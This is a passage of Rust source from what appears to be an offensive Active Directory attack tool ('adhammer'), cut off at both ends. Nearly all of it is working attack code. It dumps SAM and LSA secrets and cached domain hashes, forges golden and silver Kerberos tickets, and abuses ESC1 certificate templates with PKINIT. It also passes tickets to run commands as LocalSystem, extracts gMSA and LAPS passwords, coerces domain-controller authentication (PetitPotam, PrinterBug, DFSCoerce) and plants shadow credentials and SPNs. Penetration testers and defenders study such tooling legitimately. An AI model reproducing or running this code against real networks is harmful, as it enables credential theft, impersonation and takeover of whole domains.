                    .context("read SYSTEM hive over C$")?,
            )
        } else {
            None
        };
        let sa = if want_sam {
            smb.read_file_delete(sam_rel).await.ok()
        } else {
            None
        };
        let se = if want_security {
            smb.read_file_delete(sec_rel).await.ok()
        } else {
            None
        };
        (sys, sa, se)
    };
    eprintln!(
        "[+] hives: SYSTEM {}, SAM {}, SECURITY {}",
        system
            .as_ref()
            .map_or("skipped (RRP)".into(), |v| format!("{} B", v.len())),
        sam.as_ref()
            .map_or("unavailable".into(), |v| format!("{} B", v.len())),
        security
            .as_ref()
            .map_or("unavailable".into(), |v| format!("{} B", v.len())),
    );
    if sam.is_none() || security.is_none() {
        eprintln!(
            "[!] a protected hive was denied by the target (SeBackupPrivilege / hardening). \
             On a DC, use `attack dcsync` for domain secrets — SAM/LSA here cover only local creds."
        );
    }

    // --- SAM: local account NT hashes ---
    let sam_accounts: Option<Vec<adhammer_secrets::SamAccount>> = if let Some(u) = rrp_sam {
        Some(u)
    } else {
        match (sam.as_ref(), bootkey_rrp.as_ref(), system.as_ref()) {
            (Some(s), Some(bk), _) => adhammer_secrets::local_dump_with_bootkey(s, bk)
                .map_err(|e| eprintln!("[-] SAM decrypt failed: {e}"))
                .ok(),
            (Some(s), None, Some(sys)) => adhammer_secrets::local_dump(sys, s)
                .map_err(|e| eprintln!("[-] SAM decrypt failed: {e}"))
                .ok(),
            _ => None,
        }
    };
    match sam_accounts {
        Some(accounts) => {
            eprintln!("[+] {} local account(s):", accounts.len());
            for acct in accounts {
                println!("{}", acct.secretsdump_line());
            }
        }
        None => eprintln!("[*] SAM hive unavailable — skipping local accounts"),
    }

    // --- LSA secrets + cached domain credentials (DCC2) ---
    // RRP path returns secrets only (DCC2 needs BaseRegEnumValue — follow-up); hive path
    // returns both.
    if let Some(secrets) = rrp_lsa {
        eprintln!("[+] {} LSA secret(s):", secrets.len());
        for s in &secrets {
            if s.name.eq_ignore_ascii_case("$MACHINE.ACC") {
                let nt: String = ntlmssp::md4(&s.secret)
                    .iter()
                    .map(|b| format!("{b:02x}"))
                    .collect();
                println!("$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:{nt}:::");
            } else {
                print_lsa_secret(&s.name, &s.secret);
            }
        }
        eprintln!(
            "[*] DCC2 cache via RRP not yet implemented — falling back requires the SECURITY hive."
        );
        return Ok(());
    }
    let Some(security) = security.as_ref() else {
        eprintln!("[*] SECURITY hive unavailable — skipping LSA secrets / DCC2");
        return Ok(());
    };
    let lsa_result = match (bootkey_rrp.as_ref(), system.as_ref()) {
        (Some(bk), _) => adhammer_secrets::local_lsa_with_bootkey(security, bk),
        (None, Some(sys)) => adhammer_secrets::local_lsa(sys, security),
        _ => Err("no bootkey and no SYSTEM hive — cannot derive LSA key".into()),
    };
    match lsa_result {
        Ok(dump) => {
            eprintln!("[+] {} LSA secret(s):", dump.secrets.len());
            for s in &dump.secrets {
                if s.name.eq_ignore_ascii_case("$MACHINE.ACC") {
                    let nt: String = ntlmssp::md4(&s.secret)
                        .iter()
                        .map(|b| format!("{b:02x}"))
                        .collect();
                    println!("$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:{nt}:::");
                } else {
                    print_lsa_secret(&s.name, &s.secret);
                }
            }
            if !dump.cached.is_empty() {
                eprintln!(
                    "[+] {} cached domain logon(s) (hashcat -m 2100):",
                    dump.cached.len()
                );
                for c in &dump.cached {
                    println!("{}", c.dcc2_line());
                }
            }
        }
        Err(e) => eprintln!("[-] LSA decrypt failed: {e}"),
    }
    Ok(())
}

/// Print an LSA secret readably: a printable UTF-16 string, else hex.
fn print_lsa_secret(name: &str, secret: &[u8]) {
    // Render as text only if it's a clean printable-ASCII UTF-16 string (e.g. DefaultPassword);
    // binary key material (NL$KM, DPAPI_SYSTEM) prints as hex.
    let units: Vec<u16> = secret
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .take_while(|&u| u != 0)
        .collect();
    let printable = !units.is_empty() && units.iter().all(|&u| (0x20..0x7f).contains(&u));
    if printable {
        println!("{name}:{}", String::from_utf16_lossy(&units));
    } else {
        println!("{name}:{}", hex::encode(secret));
    }
}

/// AD CS ESC1: build a PKCS#10 CSR whose SAN is the target UPN, enroll it on an
/// enrollee-supplies-subject template via MS-ICPR, and save the issued client-auth cert + key.
/// The cert can then PKINIT as the impersonated principal.
async fn esc1(a: Esc1Args) -> Result<()> {
    use smb2_client::SmbClient;

    let subject = a.upn.split('@').next().unwrap_or("adhammer");
    let csr = adhammer_kerberos::csr::build_csr(subject, Some(&a.upn))?;
    eprintln!("[*] CSR built (subject CN={subject}, SAN upn={})", a.upn);

    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;

    let r = dcerpc::icpr::request_cert(
        &mut smb,
        &a.ca,
        &a.template,
        &csr.der,
        &a.domain,
        &a.user,
        &a.password,
        &a.host,
    )
    .await?;

    // Disposition: 3 = ISSUED, 5 = UNDER SUBMISSION (pending).
    if r.disposition == 3 && !r.cert_der.is_empty() {
        std::fs::write(&a.out, &r.cert_der)?;
        let key_path = format!("{}.key.pem", a.out);
        std::fs::write(&key_path, &csr.key_pem)?;
        println!(
            "[+] ESC1: certificate ISSUED for UPN {} → {} ({} bytes), key → {}",
            a.upn,
            a.out,
            r.cert_der.len(),
            key_path
        );

        if a.pkinit {
            let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
            let realm = a.upn.split('@').nth(1).unwrap_or(&a.domain).to_string();
            match adhammer_kerberos::pkinit::pkinit_with_cert(
                subject,
                &realm,
                &kdc,
                &csr.key_pem,
                Some(&r.cert_der),
            )
            .await
            {
                Ok(tgt) => {
                    let ccache = format!("{subject}.ccache");
                    std::fs::write(&ccache, &tgt.ccache)?;
                    println!("[+] PKINIT OK — TGT obtained as {subject}; ccache → {ccache}");
                    println!(
                        "    KRB5CCNAME={ccache} → use for Kerberos auth (dcsync, exec via -k, …)"
                    );
                }
                Err(e) => {
                    println!("[-] PKINIT with the issued cert failed: {e:#}");
                    if e.to_string().contains("error 66") {
                        println!("    (KDC_ERR_CANT_VERIFY_CERTIFICATE — likely strong certificate-mapping");
                        println!("     enforcement (KB5014754): a UPN-only cert has no SID mapping to the");
                        println!("     target, so the KDC refuses it. ESC1 escalation is mitigated on this DC.");
                        println!("     The cert was still issued — the template is vulnerable.)");
                    }
                }
            }
        } else {
            println!(
                "    next: --pkinit to turn this cert into a TGT as {}",
                subject
            );
        }
    } else {
        println!(
            "[-] enrollment not issued (disposition {}): {}",
            r.disposition, r.message
        );
    }
    Ok(())
}

/// Golden ticket: forge a TGT for an arbitrary identity, sealed + double-signed with the domain's
/// krbtgt AES256 key. Accepted by fully-patched (KB5020805) KDCs because the forged PAC carries a
/// valid KDC signature plus PAC_REQUESTOR/PAC_ATTRIBUTES.
async fn golden(a: GoldenArgs) -> Result<()> {
    use adhammer_kerberos::pac::ForgeIdentity;

    let key = parse_forge_key(&a.krbtgt_aes256, a.rc4)?;
    let subs: Vec<u32> = a
        .domain_sid
        .trim_start_matches("S-1-5-")
        .split('-')
        .map(|x| x.parse::<u32>())
        .collect::<std::result::Result<_, _>>()
        .context("--domain-sid must be S-1-5-21-a-b-c")?;

    let id = ForgeIdentity {
        user: a.user.clone(),
        rid: a.rid,
        primary_gid: 513,
        group_rids: a.groups.clone(),
        domain_subauths: subs,
        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
    };
    let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
    println!(
        "[+] forged golden TGT: {}@{} (rid {}, groups {:?})",
        a.user, a.realm, a.rid, a.groups
    );

    if let Some(spn) = &a.verify_spn {
        match adhammer_kerberos::roast_spn(&tgt, &a.user, spn, &a.kdc).await {
            Ok(_) => println!("[+] KDC accepted the golden ticket (TGS-REP for {spn})"),
            Err(e) => println!("[-] KDC rejected the golden ticket for {spn}: {e}"),
        }
    }
    if let Some(out) = &a.out {
        let cc = adhammer_kerberos::golden_ccache(&tgt, &a.user)?;
        std::fs::write(out, &cc)?;
        println!(
            "[+] wrote ccache → {out} ({} bytes). Use: KRB5CCNAME={out}",
            cc.len()
        );
    }
    Ok(())
}

/// Silver ticket: forge a service ticket (TGS) for an SPN, sealed + PAC-signed with the target
/// service account's AES256 key. Presented directly to the service (AP-REQ) without the KDC —
/// so the KDC signature is unchecked. Emits a ccache for use with `-k` / KRB5CCNAME tooling.
async fn silver(a: SilverArgs) -> Result<()> {
    use adhammer_kerberos::pac::ForgeIdentity;

    let key = parse_forge_key(&a.service_aes256, a.rc4)?;
    let subs: Vec<u32> = a
        .domain_sid
        .trim_start_matches("S-1-5-")
        .split('-')
        .map(|x| x.parse::<u32>())
        .collect::<std::result::Result<_, _>>()
        .context("--domain-sid must be S-1-5-21-a-b-c")?;

    let id = ForgeIdentity {
        user: a.user.clone(),
        rid: a.rid,
        primary_gid: 513,
        group_rids: a.groups.clone(),
        domain_subauths: subs,
        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
    };
    let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &a.spn, a.rc4)?;
    println!(
        "[+] forged silver ticket: {}@{} for {} (rid {})",
        a.user, a.realm, a.spn, a.rid
    );
    if let Some(out) = &a.out {
        let cc = adhammer_kerberos::silver_ccache(&tgt, &a.user, &a.spn)?;
        std::fs::write(out, &cc)?;
        println!("[+] wrote ccache → {out} ({} bytes)", cc.len());
    }
    Ok(())
}

/// Pass-the-ticket: forge a golden or silver ticket, obtain a service ticket for the SPN, and
/// authenticate to SMB with a Kerberos AP-REQ — then optionally run a command as the impersonated
/// identity (LocalSystem via SVCCTL). The end-to-end proof that a forged ticket grants access.
/// True if `s` looks like an IPv4/IPv6 literal (heuristic — good enough for the SPN check).
fn looks_like_ip(s: &str) -> bool {
    s.parse::<std::net::IpAddr>().is_ok()
}

async fn pth(a: PthArgs) -> Result<()> {
    use adhammer_kerberos::pac::ForgeIdentity;
    use smb2_client::SmbClient;

    let subs: Vec<u32> = a
        .domain_sid
        .trim_start_matches("S-1-5-")
        .split('-')
        .map(|x| x.parse::<u32>())
        .collect::<std::result::Result<_, _>>()
        .context("--domain-sid must be S-1-5-21-a-b-c")?;
    let spn = a.spn.clone().unwrap_or_else(|| format!("cifs/{}", a.host));
    // Kerberos SPNs are registered against hostnames/FQDNs — never against IPs. Save the user
    // a `KDC_ERR_S_PRINCIPAL_UNKNOWN` roundtrip by front-checking.
    if spn.split('/').nth(1).is_some_and(looks_like_ip) {
        anyhow::bail!(
            "SPN '{spn}' points at an IP — the KDC only knows SPNs registered against \
             hostnames/FQDNs and will return KDC_ERR_S_PRINCIPAL_UNKNOWN (7). Pass \
             `--host <fqdn>` (e.g. dc.corp.local) or `--spn cifs/<fqdn>` explicitly."
        );
    }
    let id = ForgeIdentity {
        user: a.user.clone(),
        rid: a.rid,
        primary_gid: 513,
        group_rids: a.groups.clone(),
        domain_subauths: subs,
        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
    };

    // Build the service ticket: golden → TGS-REQ; silver → forged directly.
    let st = match (&a.krbtgt_aes256, &a.service_aes256) {
        (Some(k), None) => {
            let key = parse_forge_key(k, a.rc4)?;
            let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
            let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
            println!("[+] forged golden TGT for {}@{}", a.user, a.realm);
            let st = adhammer_kerberos::get_service_ticket(&tgt, &spn, &kdc).await?;
            println!("[+] got service ticket for {spn} (KDC accepted the golden TGT)");
            st
        }
        (None, Some(k)) => {
            let key = parse_forge_key(k, a.rc4)?;
            let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &spn, a.rc4)?;
            println!("[+] forged silver ticket for {spn}");
            adhammer_kerberos::silver_service_ticket(&tgt, &spn)
        }
        _ => anyhow::bail!(
            "provide exactly one of --krbtgt-aes256 (golden) or --service-aes256 (silver)"
        ),
    };

    let (blob, key) = adhammer_kerberos::build_ap_req_gss(&st)?;
    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login_kerberos(&blob, &key).await?;
    println!(
        "[+] Kerberos SMB session established as {} (pass-the-ticket)",
        a.user
    );

    if let Some(cmd) = &a.command {
        smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
        let r = dcerpc::svcctl::exec(&mut smb, &a.host, cmd).await?;
        println!(
            "[+] ran as LocalSystem (service '{}', win32 {})",
            r.service, r.start_win32
        );
        match r.output {
            Some(o) if !o.is_empty() => println!("\n{o}"),
            _ => println!("[*] no output captured"),
        }
    } else {
        smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
        println!(
            "[+] tree-connected \\\\{}\\C$ — authenticated access confirmed",
            a.host
        );
    }
    Ok(())
}

/// Read a gMSA's managed password over LDAP and derive its NT hash. The managed password is a
/// constructed attribute the DC returns only over a sealed channel (LDAPS here) to principals in
/// `msDS-GroupMSAMembership`. Output is PtH/hashcat-usable.
async fn gmsa(mut a: GmsaArgs) -> Result<()> {
    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD");
    use adhammer_collector::{Collector, LdapConfig};
    // msDS-ManagedPassword is a "confidential" attribute — AD returns it *only* over an
    // encrypted channel (LDAPS or sealed SASL). Fail fast with a clear message rather than
    // let ldap3 surface a raw `UNABLE_TO_PROCEED` from the server.
    if a.url.starts_with("ldap://") {
        anyhow::bail!(
            "gMSA managed-password read needs an encrypted channel — use `ldaps://` \
             (add --insecure for self-signed). Plain ldap:// will return \
             UNABLE_TO_PROCEED even for an authorized reader."
        );
    }
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    let blob = c
        .read_attr_bin(&a.target, "msDS-ManagedPassword")
        .await
        .with_context(|| {
            format!(
                "read msDS-ManagedPassword on '{}' — is it a gMSA? is the bind identity in \
                 PrincipalsAllowedToRetrieveManagedPassword?",
                a.target
            )
        })?
        .with_context(|| {
            format!(
                "'{}' returned no msDS-ManagedPassword (not a gMSA, or the bind identity \
                 isn't allowed to retrieve it)",
                a.target
            )
        })?;
    let pw = parse_managed_password_blob(&blob).context("parse MSDS-MANAGEDPASSWORD_BLOB")?;
    let nt = ntlmssp::md4(&pw);
    let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
    // secretsdump-style line; the RID is unknown here, so print sam + hash.
    println!("{}:aad3b435b51404eeaad3b435b51404ee:{}:::", a.target, nthex);
    eprintln!(
        "[+] gMSA {} current-password NT hash recovered ({} blob bytes)",
        a.target,
        blob.len()
    );
    Ok(())
}

/// Read LAPS local-administrator passwords over LDAPS — one host (`--target WIN11$`) or every
/// computer whose LAPS attribute the bind identity can read. Ubiquitous instant-local-admin;
/// chain the cleartext into `attack exec`/`secretsdump` as the local Administrator.
/// Decrypt a raw `msLAPS-EncryptedPassword` blob via MS-GKDI `GetKey` against the DC. Returns
/// (account name, cleartext password) on success. The GKDI RPC is sealed — the DC only hands
/// out the group key if the bind identity is authorized to read the LAPS password.
async fn decrypt_encrypted_laps(
    dc_host: &str,
    domain: &str,
    user: &str,
    password: &str,
    laps_attr_value: &[u8],
) -> Result<(String, String)> {
    use dpapi_ng::{decrypt, laps_password_from_json, rpc, LapsBlob};

    let laps = LapsBlob::parse(laps_attr_value)
        .map_err(|e| anyhow::anyhow!("parse LAPS header: {e:?}"))?;
    let protected = laps
        .protected()
        .map_err(|e| anyhow::anyhow!("parse CMS ProtectedBlob: {e:?}"))?;
    let id = &protected.key_identifier;
    let envelope = rpc::get_key(
        dc_host,
        domain,
        user,
        password,
        &[], // empty target SD — DC uses the requestor's context (dploot/netexec default)
        Some(id.root_key_id),
        id.l0,
        id.l1,
        id.l2,
    )
    .await
    .map_err(|e| anyhow::anyhow!("GKDI GetKey: {e}"))?;
    let plaintext_utf16 =
        decrypt(&protected, &envelope).map_err(|e| anyhow::anyhow!("DPAPI-NG decrypt: {e:?}"))?;
    // Windows LAPS stores `{"n":"<account>","t":"<hex>","p":"<pw>"}` as UTF-16LE.
    let pw = laps_password_from_json(&plaintext_utf16)
        .ok_or_else(|| anyhow::anyhow!("decrypted blob has no 'p' field"))?;
    let account = {
        let json = String::from_utf16_lossy(
            &plaintext_utf16
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect::<Vec<_>>(),
        );
        json.find("\"n\"")
            .and_then(|at| json[at + 3..].find('"').map(|s| at + 3 + s + 1))
            .and_then(|s| json[s..].find('"').map(|e| json[s..s + e].to_string()))
            .unwrap_or_else(|| "Administrator".into())
    };
    Ok((account, pw))
}

async fn laps(mut a: LapsArgs) -> Result<()> {
    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD");
    use adhammer_collector::{Collector, LdapConfig};
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let sp = ui::Spinner::start("reading LAPS passwords over LDAPS");
    let mut c = Collector::connect(&cfg).await?;
    let entries = c.read_laps(a.target.as_deref()).await?;
    sp.done(&format!("{} LAPS entr(y/ies) returned", entries.len()));
    if entries.is_empty() {
        anyhow::bail!(
            "no LAPS password readable (no LAPS deployed, or the bind identity lacks the read right — try a specific --target <HOST$>)"
        );
    }

    // For encrypted LAPS we need a KDC hostname + a DOMAIN\user bind for the sealed GKDI
    // GetKey RPC. Both are derived from the LDAP config we already have.
    let dc_host = a
        .url
        .trim_start_matches("ldaps://")
        .trim_start_matches("ldap://")
        .split('/')
        .next()
        .unwrap_or("")
        .split(':')
        .next()
        .unwrap_or("")
        .to_string();
    let (domain, user) = a
        .user
        .split_once('\\')
        .map(|(d, u)| (d.to_string(), u.to_string()))
        .unwrap_or_else(|| (String::new(), a.user.clone()));

    let mut cleartext = 0usize;
    for e in &entries {
        if let Some(pw) = &e.password {
            cleartext += 1;
            let exp = e
                .expires
                .as_deref()
                .map(|x| format!("  expires={x}"))
                .unwrap_or_default();
            // TAB-separated: HOST$  account  password  [expires]
            println!("{}\t{}\t{}{}", e.sam, e.account, pw, exp);
            continue;
        }
        // Encrypted-LAPS path: msLAPS-EncryptedPassword → LAPS header → CMS ProtectedBlob →
        // MS-GKDI GetKey for the blob's KeyIdentifier → derive L2 key → open the blob.
        let Some(bytes) = &e.encrypted_blob else {
            eprintln!(
                "[!] {}: no cleartext and no encrypted blob to work with",
                e.sam
            );
            continue;
        };
        match decrypt_encrypted_laps(&dc_host, &domain, &user, &a.password, bytes).await {
            Ok((account, pw)) => {
                cleartext += 1;
                println!("{}\t{}\t{}", e.sam, account, pw);
            }
            Err(err) => eprintln!(
                "[!] {} DPAPI-NG decrypt failed: {err} (bind identity may lack the GKDI read right)",
                e.sam
            ),
        }
    }
    ui::ok(&format!(
        "LAPS: {cleartext} cleartext local-admin password(s) recovered"
    ));
    Ok(())
}

/// Execute a command over WinRM (WS-Man). NTLM auth + MS-NLMP message encryption over 5985 —
/// quieter than SVCCTL (no service-install event) and often the only lateral path left open.
async fn winrm_exec(mut a: WinrmArgs) -> Result<()> {
    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD");
    let secret = match &a.nt_hash {
        Some(h) => {
            let raw = hex::decode(h.trim()).context("NT hash must be 32 hex chars")?;
            let arr: [u8; 16] = raw
                .as_slice()
                .try_into()
                .context("NT hash must be exactly 16 bytes (32 hex)")?;
            winrm::Secret::NtHash(arr)
        }
        None => winrm::Secret::Password(a.password.clone()),
    };
    let (mut client, shell_id) =
        winrm::WinRm::connect(&a.host, a.port, &a.domain, &a.user, &secret).await?;
    eprintln!(
        "[+] WinRM shell opened on {} (ShellId {})",
        a.host, shell_id
    );
    let (stdout, stderr, exit) = client.run(&shell_id, &a.command).await?;
    print!("{stdout}");
    if !stderr.is_empty() {
        eprint!("{stderr}");
    }
    eprintln!("[+] WinRM command exited {exit}");
    Ok(())
}

/// Enumerate AD-integrated DNS over LDAP (adidnsdump-equivalent): list every zone + record from
/// the DomainDnsZones/ForestDnsZones partitions, and flag wildcard nodes — a wildcard (or any
/// writable node) turns ADIDNS into a mitm6 / WPAD name-hijack primitive.
async fn dnsenum(a: DnsArgs) -> Result<()> {
    use adhammer_collector::{Collector, LdapConfig};
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let sp = ui::Spinner::start("connecting + reading ADIDNS zones");
    let mut c = Collector::connect(&cfg).await?;
    let zones = c.read_adidns().await?;
    sp.done(&format!("{} ADIDNS zone(s) read", zones.len()));
    if zones.is_empty() {
        ui::warn("no ADIDNS zones readable");
        return Ok(());
    }
    let (mut total, mut wildcards) = (0usize, 0usize);
    for z in &zones {
        ui::header(&format!("{} ({} records)", z.name, z.records.len()));
        for r in &z.records {
            total += 1;
            let wild = r.node == "*";
            if wild {
                wildcards += 1;
            }
            let mut tags = String::new();
            if wild {
                tags.push_str(&format!("  {}", ui::accent("◄ WILDCARD")));
            }
            if r.tombstoned {
                tags.push_str(&format!("  {}", ui::dim("(tombstoned)")));
            }
            println!(
                "  {:<28} {} {}{}",
                r.node,
                ui::dim(&format!("{:<6}", r.rtype)),
                r.data,
                tags
            );
        }
    }
    ui::ok(&format!(
        "ADIDNS: {} zone(s), {total} record(s), {wildcards} wildcard(s)",
        zones.len()
    ));
    if wildcards > 0 {
        ui::warn("wildcard record present → ADIDNS/mitm6-style name-hijack surface");
    }
    Ok(())
}

/// Extract the CurrentPassword bytes from an MSDS-MANAGEDPASSWORD_BLOB (MS-ADTS §2.2.19).
fn parse_managed_password_blob(b: &[u8]) -> Option<Vec<u8>> {
    if b.len() < 16 {
        return None;
    }
    let cur_off = u16::from_le_bytes([b[8], b[9]]) as usize; // CurrentPasswordOffset
    let prev_off = u16::from_le_bytes([b[10], b[11]]) as usize; // PreviousPasswordOffset (0 = none)
    let end = if prev_off > cur_off {
        prev_off
    } else {
        b.len()
    };
    let pw = b.get(cur_off..end)?;
    // The password buffer is a fixed 256-byte WCHAR[128]; hash exactly those bytes.
    Some(pw.get(..256).unwrap_or(pw).to_vec())
}

/// PetitPotam-style coercion: make the DC authenticate to `--listener` via MS-EFSR.
async fn coerce(mut a: CoerceArgs) -> Result<()> {
    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD");
    use smb2_client::SmbClient;

    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;

    if a.pipe.eq_ignore_ascii_case("spoolss") {
        // PrinterBug (MS-RPRN): open a printer on the target, then RFFPCNEx → callback to us.
        use dcerpc::rprn::{printerbug_tcp, PrinterBug};
        // Try the \spoolss SMB pipe first; modern spoolers only expose ncacn_ip_tcp (via EPM).
        let target = a.target.clone().unwrap_or_else(|| a.host.clone());
        let via_pipe = match smb.open_pipe("spoolss").await {
            Ok(pipe) => {
                let mut client = PrinterBug::bind(&mut smb, pipe).await?;
                Some(client.coerce(&target, &a.listener).await)
            }
            Err(_) => None,
        };
        let result = match via_pipe {
            Some(r) => r,
            None => {
                printerbug_tcp(
                    &a.host,
                    &a.domain,
                    &a.user,
                    &a.password,
                    &target,
                    &a.listener,
                )
                .await
            }
        };
        match result {
            Ok(status) => {
                println!("[+] PrinterBug (RFFPCNEx) accepted — status {status:#010x}");
                println!("    {} spooler attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
            }
            Err(e) => {
                println!("[-] PrinterBug failed/patched (spooler off or remote RPC blocked): {e}")
            }
        }
        return Ok(());
    }

    // MS-DFSNM (DFSCoerce): NetrDfsAddStdRoot over \netdfs — makes the DC auth to ServerName.
    if a.pipe.eq_ignore_ascii_case("netdfs") {
        use dcerpc::dfsnm::CoerceClient as DfsClient;
        let pipe = smb.open_pipe("netdfs").await?;
        let mut client =
            DfsClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
                .await?;
        match client.coerce(&a.listener).await {
            Ok(status) => {
                println!("[+] NetrDfsAddStdRoot accepted via \\netdfs — status {status:#010x}");
                println!("    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
            }
            Err(e) => println!(
                "[-] DFSCoerce failed on this DC ({e}) — try `--pipe spoolss` (PrinterBug); netdfs is picky about transport/auth-level on modern Windows"
            ),
        }
        return Ok(());
    }

    // MS-FSRVP (ShadowyCoerce): IsPathSupported over \FssagentRpc — makes the VSS provider
    // auth to ShareName. Needs the File Server VSS Agent Service enabled.
    if a.pipe.eq_ignore_ascii_case("fssagentrpc") {
        use dcerpc::fsrvp::CoerceClient as VssClient;
        let pipe = smb.open_pipe("FssagentRpc").await?;
        let mut client =
            VssClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
                .await?;
        match client.coerce(&a.listener).await {
            Ok(status) => {
                println!("[+] IsPathSupported accepted via \\FssagentRpc — status {status:#010x}");
                println!("    {} VSS provider attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
            }
            Err(e) => println!(
                "[-] ShadowyCoerce failed ({e}) — needs FS-VSS-Agent role installed AND Backup Operators rights; try `--pipe spoolss` for a reliable alternative"
            ),
        }
        return Ok(());
    }

    // MS-EFSR (PetitPotam) over \lsarpc or \efsrpc.
    use dcerpc::efsr::CoerceClient;
    let pipe = smb.open_pipe(&a.pipe).await?;
    let mut client =
        CoerceClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host).await?;
    match client.coerce(&a.listener).await {
        Ok(status) => {
            println!(
                "[+] EfsRpcOpenFileRaw accepted via \\{} — status {status:#010x}",
                a.pipe
            );
            println!(
                "    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)",
                a.host, a.listener
            );
        }
        Err(e) => println!(
            "[-] EFSR via \\{} failed ({e}) — MS-EFSR is restricted/removed on Server 2016+ hardening; use `--pipe spoolss` (PrinterBug) instead",
            a.pipe
        ),
    }
    Ok(())
}

/// Active LDAP abuse — the exploitation counterpart to the ACL findings the graph reports.
async fn abuse(mut a: AbuseArgs) -> Result<()> {
    // AbuseArgs.password is Option<String>; resolve via env var only when unset or empty.
    if a.password.as_deref().map_or(true, |s| s.is_empty()) {
        let env = std::env::var("ADHAMMER_PASSWORD").ok().filter(|v| !v.is_empty());
        if env.is_some() {
            a.password = env;
        }
    }
    // pkinit is a KDC exchange, not an LDAP write — handle it before touching LDAP.
    if a.action == "pkinit" {
        let realm = a.realm.clone().context("pkinit needs --realm")?;
        let kdc = a.kdc.clone().context("pkinit needs --kdc")?;
        let key_path = if a.value.is_empty() {
            format!("{}.key.pem", a.target)
        } else {
            a.value.clone()
        };
        let pem =
            std::fs::read_to_string(&key_path).with_context(|| format!("read key {key_path}"))?;
        let tgt =
            adhammer_kerberos::pkinit::pkinit_authenticate(&a.target, &realm, &kdc, &pem).await?;
        let cc_path = format!("{}.ccache", a.target);
        std::fs::write(&cc_path, &tgt.ccache)?;
        println!(
            "[+] PKINIT succeeded — TGT for {}@{} (via {})",
            a.target, realm, tgt.sname
        );
        println!("    reply key derived from DH + AS-REP enc-part decrypted (holder of the registered key)");
        println!("    ticket valid until {}", tgt.end_time);
        println!("    ccache saved to {cc_path}  (export KRB5CCNAME={cc_path})");
        return Ok(());
    }

    // add-keycred over raw LDAP-389 + NTLM SASL (no LDAPS) — also the relay code path.
    if a.ldap389 {
        let host = a.host.clone().context("--ldap389 needs --host")?;
        let realm = a.realm.clone().context("--ldap389 needs --realm")?;
        let user = a.user.clone().context("--ldap389 needs --user")?;
        let password = a.password.clone().context("--ldap389 needs --password")?;
        let bare = user
            .split('@')
            .next()
            .unwrap_or(&user)
            .rsplit('\\')
            .next()
            .unwrap_or(&user)
            .to_string();
        let base: String = realm
            .split('.')
            .map(|p| format!("DC={p}"))
            .collect::<Vec<_>>()
            .join(",");
        let mut ld = adhammer_ldap::LdapClient::connect(&format!("{host}:389")).await?;
        ld.bind_ntlm(&realm, &bare, &password, "ADHAMMER").await?;
        let dn = ld.find_dn(&base, &a.target).await?;
        let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
        ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
            .await?;
        std::fs::write(format!("{}.key.pem", a.target), &kc.private_key_pem)?;
        println!("[+] LDAP-389 (NTLM SASL) add-keycred on {dn}");
        println!(
            "    key saved to {}.key.pem — Phase 2: attack abuse --action pkinit --target {}",
            a.target, a.target
        );
        return Ok(());
    }

    let cfg = LdapConfig {
        url: a.url.clone().context("this action needs --url")?,
        bind_dn: a.user.clone().context("this action needs --user")?,
        password: a.password.clone().context("this action needs --password")?,
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    let target_dn = c.resolve_dn(&a.target).await?;

    match a.action.as_str() {
        "add-spn" => {
            c.add_value(&target_dn, "servicePrincipalName", &a.value).await?;
            println!("[+] added SPN '{}' to {} — now Kerberoastable", a.value, a.target);
        }
        "add-member" => {
            let member_dn = c.resolve_dn(&a.value).await?;
